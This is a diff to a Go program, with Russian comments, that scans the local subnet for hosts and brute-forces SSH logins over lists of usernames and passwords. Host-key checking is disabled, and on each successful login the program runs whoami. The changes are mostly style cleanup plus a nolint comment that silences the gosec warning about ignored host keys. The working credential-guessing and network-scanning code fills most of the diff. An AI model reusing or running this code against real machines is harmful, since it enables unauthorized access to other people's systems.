@@ -34,22 +34,18 @@ func main() {
 
 	// подбор пароля
 	for _, sshHost := range allHost {
-
 		for _, us := range username {
-
 			for _, pas := range passwords {
-
 				config := &ssh.ClientConfig{
 					User: us,
 					Auth: []ssh.AuthMethod{
 						ssh.Password(pas),
 					},
 					Timeout:         10 * time.Second,
-					HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+					HostKeyCallback: ssh.InsecureIgnoreHostKey(), //nolint:gosec // так надо
 				}
 
 				client, err := ssh.Dial("tcp", sshHost+":22", config)
-
 				if err != nil {
 					continue
 				}
@@ -69,8 +65,7 @@ func main() {
 func myNet() []string {
 	addrs, err := net.InterfaceAddrs()
 	if err != nil {
-		log.Println(err)
-		os.Exit(1)
+		log.Fatalln(err)
 	}
 
 	result := make([]string, 0)
@@ -104,42 +99,47 @@ func searchHosts(netIP []string) []string {
 			if err == nil {
 				// отправка текста
 				fmt.Fprintf(conn, "HELLO\r\n")
-				buf := make([]byte, 0, 4096) // big buffer
-				tmp := make([]byte, 256)     // using small tmo buffer for demonstrating
+
+				tmp := make([]byte, 256) // using small tmo buffer for demonstrating
+
 				for {
-					n, err := conn.Read(tmp)
+					_, err := conn.Read(tmp)
 					if err != nil {
 						if err != io.EOF {
-							fmt.Println("read error:", err)
+							log.Println("read error:", err)
 						}
+
 						break
 					}
-					buf = append(buf, tmp[:n]...)
 				}
+
 				conn.Close()
+
 				allHosts = append(allHosts, host+strconv.Itoa(i))
 			} else {
 				continue
 			}
 		}
 	}
+
 	return allHosts
 }
 
 func doIt(client *ssh.Client) {
 	session, err := client.NewSession()
 	if err != nil {
-		panic("Failed to create session: " + err.Error())
+		log.Fatalln("fFailed to create session: " + err.Error())
 	}
-	defer session.Close()
 
 	var b bytes.Buffer
 	session.Stdout = &b
+
 	if err := session.Run("/usr/bin/whoami"); err != nil {
-		panic("Failed to run: " + err.Error())
+		log.Fatalln("failed to run: " + err.Error())
 	}
 
 	fmt.Println(b.String())
+	session.Close()
 
 	os.Exit(0)
 }
